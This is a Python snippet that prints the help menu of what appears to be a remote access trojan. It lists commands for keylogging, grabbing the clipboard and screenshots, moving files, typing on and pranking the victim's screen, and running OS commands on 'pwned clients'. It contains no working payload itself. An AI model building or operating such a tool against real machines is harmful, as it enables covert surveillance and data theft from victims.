
# Print Client Commands
print("\033[1;32m" + "=== Client Commands ===" + "\033[0m")
print(
    "\033[1;34mclient download FILENAME\033[0m  => transfer a file from the server to the client",
    "\033[1;34mclient upload FILENAME\033[0m    => transfer a file from the client to the server",
    "\033[1;34mclient zip FILENAME\033[0m       => zip and encrypt a file on the client",
    "\033[1;34mclient unzip FILENAME\033[0m     => unzip and decrypt a file on the client",
    "\033[1;34mclient kill\033[0m               => permanently shutdown the active client",
    "\033[1;34mclient delay SECONDS\033[0m      => change the delay setting for a client's reconnection attempts",
    "\033[1;34mclient get clipboard\033[0m      => grab a copy of the client's clipboard",
    "\033[1;34mclient keylog on\033[0m          => start up a keylogger on the client",
    "\033[1;34mclient keylog off\033[0m         => turn off the keylogger on the client and write the results to disk",
    "\033[1;34mclient type TEXT\033[0m          => type the text you choose on a client's keyboard",
    "\033[1;34mclient screenshot\033[0m         => grab a copy of the client's screen",
    "\033[1;34mclient display IMAGE\033[0m      => display an image on the client's screen",
    "\033[1;34mclient max sound\033[0m          => turn a client's volume all the way up",
    "\033[1;34mclient play FILENAME.wav\033[0m => play a .wav sound file on the client (Windows Only)",
    "\033[1;34mclient flip screen\033[0m        => flip a client's screen upside down (Windows Only)",
    "\033[1;34mclient rotate screen\033[0m      => rotate a client's screen upside down (Windows Only)",
    "\033[1;34m*\033[0m                        => run an OS command on the client that doesn't require input",
    "\033[1;34m* &\033[0m                      => run an OS command on the client in the background",
    sep="\n"
)

# Print Server Commands
print("\n\033[1;32m" + "=== Server Commands ===" + "\033[0m")
print(
    "\033[1;33mserver show clients\033[0m      => print an active listing of our pwned clients",
    "\033[1;33mserver control PWNED_ID\033[0m  => change the active client that you have a prompt for",
    "\033[1;33mserver zip FILENAME\033[0m      => zip and encrypt a file in the outgoing folder on the server",
    "\033[1;33mserver unzip FILENAME\033[0m    => unzip and decrypt a file in the incoming folder on the server",
    "\033[1;33mserver list DIRECTORY\033[0m    => obtain a file listing of a directory on the server",
    "\033[1;33mserver shell\033[0m             => obtain a shell on the server",
    "\033[1;33mserver exit\033[0m              => gracefully shuts down the server",
    sep="\n"
)
